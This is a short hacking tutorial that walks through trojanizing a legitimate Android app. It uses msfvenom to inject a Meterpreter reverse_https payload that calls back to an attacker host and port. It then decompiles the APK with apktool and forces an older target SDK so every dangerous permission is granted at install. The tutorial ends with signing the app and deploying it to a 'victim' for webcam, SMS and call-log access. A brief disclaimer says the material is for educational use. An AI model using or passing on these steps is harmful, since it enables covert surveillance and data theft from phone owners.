### Creating APK with Backdoor which Asks for all Permissions during Installation
**Author: Joshua Abdullah a.k.a. Acronix<br />
Made for Educational Purposes Only!**

Here I used the reverse_https payload instead of reverse_tcp in order to take advantage of its ability to resume connection upon disconnect.

So I injected a payload inside a legitimate android app (original.apk):
    ```
    $ msfvenom -x original.apk -p android/meterpreter/reverse_https LHOST=192.168.1.5 LPORT=4490 R > backdoored-original.apk
    ```

The resulting apk would be "backdoored-original.apk" By the way, you can substitute the LHOST and LPORT, including the apk names with what you prefer.

Now, by default the compilation process uses Sdk Version 23 which no longer asks for "dangerous" permissions upon install. Instead they are asked during run time. This may be a problem when using metasploit because your backdoored app will not give you the proper permissions during the attack. Therefore, you will not be able to do most of the attacks like streaming the webcam or dumping sms and call logs.

Well, perhaps you can just manually turn on the permissions in the settings (provided you still have physical access to the android phone). But I have found a work around in bringing back the permission requests during installation.

First we have to decompile the apk using apktool:
    ```
    $ apktool d -f -o targetfolder backdoored-original.apk
    ```

Now let's edit the AndroidManifest.xml found in the main directory of the decompiled apk.
    ```
    $ cd targetfolder
    $ gedit AndroidManifest.xml
    ```

Then we have to insert this line somewhere in the file (perhaps before any <uses-permission tag):

    ```
    <uses-sdk android:targetSdkVersion="22"/>
    ```

This tag tells the compiler to use Sdk Version 22 which happily asks for all the permissions during installation. 

Awesome right? Go ahead and save the file and exit gedit.

Then let's proceed to recompile our apk:
    ```
    $ cd ..
    $ apktool b targetfolder
    ```

Your new apk can now be found at targetfolder/dist/backdoored-original.apk

Don't forget to sign your new apk before deploying it to your target. There are many tutorials in the Internet on how to sign an apk file.

That's it. Once the victim installs and executes your backdoored app, metasploit now has full access permission over his/her phone. 

*Remember: The hacking tools and knowledge that we share here should not be used on a target without prior mutual consent. It is the end user's responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused by this site.*
